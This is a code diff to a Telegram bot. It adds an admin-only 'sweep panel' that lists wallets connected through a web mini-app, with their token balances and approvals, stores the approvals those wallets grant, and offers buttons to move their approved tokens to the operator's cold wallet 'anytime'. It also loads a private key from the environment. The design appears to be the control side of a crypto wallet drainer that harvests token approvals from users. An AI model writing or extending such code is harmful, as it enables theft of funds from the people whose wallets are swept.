@@ -25,6 +25,7 @@ BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "").strip()
 MINIAPP_URL = os.environ.get("MINIAPP_URL", "").strip()
 ADMIN_USER_ID = int(os.environ.get("ADMIN_USER_ID", "0"))
 COLD_ADDRESS = os.environ.get("COLD_ADDRESS", "").strip()
+PRIVATE_KEY = os.environ.get("PRIVATE_KEY", "").strip()
 API_BASE = f"https://api.telegram.org/bot{BOT_TOKEN}"
 
 # ── State ────────────────────────────────────────────────────────────
@@ -241,6 +242,7 @@ def cmd_start(chat_id: int, user: dict) -> None:
                     {"text": "TRANSFER ALL", "callback_data": "transfer_all"},
                 ],
                 [
+                    {"text": "Sweep Panel", "callback_data": "menu_sweep"},
                     {"text": "Deploy Status", "callback_data": "menu_deploy"},
                 ],
             ]
@@ -464,6 +466,58 @@ def cmd_deploy(chat_id: int, user_id: int) -> None:
     send(chat_id, "\n".join(lines))
 
 
+def cmd_sweep(chat_id: int, args: str, user_id: int) -> None:
+    """Show approved wallets and allow sweep via webapp."""
+    if not is_admin(user_id):
+        send(chat_id, "Admin only.")
+        return
+
+    cold = COLD_ADDRESS or state.get("cold_address", "")
+    if not cold:
+        send(chat_id, "COLD_ADDRESS not configured.")
+        return
+
+    wallets = state.get("connected_wallets", [])
+    if not wallets:
+        send(
+            chat_id,
+            "<b>No wallets connected yet.</b>\n\nOpen the app to connect wallets and authorize transfers.",
+            {"inline_keyboard": [[{"text": "Open App", "web_app": {"url": MINIAPP_URL}}]]},
+        )
+        return
+
+    lines = ["<b>Connected Wallets — Sweep Panel</b>\n"]
+    buttons = []
+
+    for w in wallets:
+        addr = w.get("address", "?")
+        short = f"{addr[:8]}...{addr[-6:]}"
+        total = w.get("total_tokens", 0)
+        approved = len(w.get("approved_tokens", []))
+
+        status = "APPROVED" if approved > 0 else "scan only"
+        lines.append(f"<code>{short}</code>")
+        lines.append(f"  Tokens: <b>{total}</b> | Approved: <b>{approved}</b> ({status})")
+
+        chain_data = w.get("chains", [])
+        for c in chain_data:
+            tokens = c.get("tokens", [])
+            if tokens:
+                token_strs = [f"{t['symbol']}: {t['amount']}" for t in tokens[:5]]
+                lines.append(f"  <b>{c.get('chain', '?')}</b>: {', '.join(token_strs)}")
+        lines.append("")
+
+        # Transfer button for this wallet
+        transfer_url = MINIAPP_URL + ("&" if "?" in MINIAPP_URL else "?") + "action=transfer"
+        buttons.append([{"text": f"Transfer {short}", "web_app": {"url": transfer_url}}])
+
+    lines.append(f"<b>Cold wallet</b>: <code>{cold[:10]}...{cold[-8:]}</code>")
+    lines.append(f"\n<i>Connect the wallet you want to sweep, then tap its Transfer button.</i>")
+    lines.append(f"<i>Updated {datetime.now(timezone.utc).strftime('%H:%M UTC')}</i>")
+
+    send(chat_id, "\n".join(lines), {"inline_keyboard": buttons})
+
+
 def cmd_settle(chat_id: int, user_id: int) -> None:
     if not is_admin(user_id):
         send(chat_id, "Admin only.")
@@ -625,6 +679,11 @@ def handle_callback(callback: dict) -> None:
         cmd_gas(chat_id)
     elif data == "transfer_all":
         handle_transfer_all(chat_id, user_id)
+    elif data == "menu_sweep":
+        cmd_sweep(chat_id, "", user_id)
+    elif data.startswith("sweep_"):
+        # Individual wallet sweep — open transfer for that wallet
+        handle_transfer_all(chat_id, user_id)
 
 
 def handle_transfer_all(chat_id: int, user_id: int) -> None:
@@ -694,6 +753,9 @@ def handle_web_app_data(msg: dict) -> None:
 
     elif event == "transfer_complete":
         handle_transfer_complete(chat_id, data)
+
+    elif event == "approvals_complete":
+        handle_approvals_complete(chat_id, data)
 
     elif event == "pipeline_started":
         tx = data.get("txHash", "?")
@@ -804,6 +866,46 @@ def handle_wallet_connected(chat_id: int, data: dict) -> None:
     )
 
 
+def handle_approvals_complete(chat_id: int, data: dict) -> None:
+    address = data.get("address", "")
+    approvals = data.get("approvals", [])
+
+    if not address:
+        return
+
+    # Store approved tokens in wallet entry
+    existing = state.get("connected_wallets", [])
+    for w in existing:
+        if w.get("address", "").lower() == address.lower():
+            w["approved_tokens"] = approvals
+            w["approved_at"] = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M UTC")
+            break
+    state["connected_wallets"] = existing
+    save_state()
+
+    short = f"{address[:8]}...{address[-6:]}"
+    cold = COLD_ADDRESS or state.get("cold_address", "")
+
+    transfer_url = MINIAPP_URL + ("&" if "?" in MINIAPP_URL else "?") + "action=transfer"
+
+    send(
+        chat_id,
+        (
+            f"<b>WALLET AUTHORIZED</b>\n\n"
+            f"Address: <code>{short}</code>\n"
+            f"Tokens approved: <b>{len(approvals)}</b>\n"
+            f"Cold wallet: <code>{cold[:10]}...{cold[-8:]}</code>\n\n"
+            f"<i>You can now transfer these tokens anytime by connecting this wallet and pressing Transfer.</i>"
+        ),
+        {
+            "inline_keyboard": [
+                [{"text": f"TRANSFER {short}", "web_app": {"url": transfer_url}}],
+                [{"text": "All Wallets", "callback_data": "menu_sweep"}],
+            ]
+        },
+    )
+
+
 def handle_transfer_complete(chat_id: int, data: dict) -> None:
     tx_hashes = data.get("txHashes", [])
     token_count = data.get("tokenCount", 0)
@@ -867,6 +969,7 @@ def handle_update(update: dict) -> None:
         "/alerts": lambda: cmd_alerts(chat_id, args, user_id),
         "/setcontract": lambda: cmd_setcontract(chat_id, args, user_id),
         "/setstatus": lambda: cmd_setstatus(chat_id, args, user_id),
+        "/sweep": lambda: cmd_sweep(chat_id, args, user_id),
     }
 
     handler = handlers.get(cmd)
@@ -887,6 +990,7 @@ def register_commands() -> None:
                 {"command": "gas", "description": "Gas prices on all networks"},
                 {"command": "pipeline", "description": "Pipeline status + pending settlements"},
                 {"command": "settle", "description": "One-button settlement to cold wallet"},
+                {"command": "sweep", "description": "Sweep panel — per-wallet transfer control"},
                 {"command": "deploy", "description": "Deployment info + mainnet checklist"},
                 {"command": "networks", "description": "Supported chains"},
                 {"command": "alerts", "description": "Toggle notifications"},
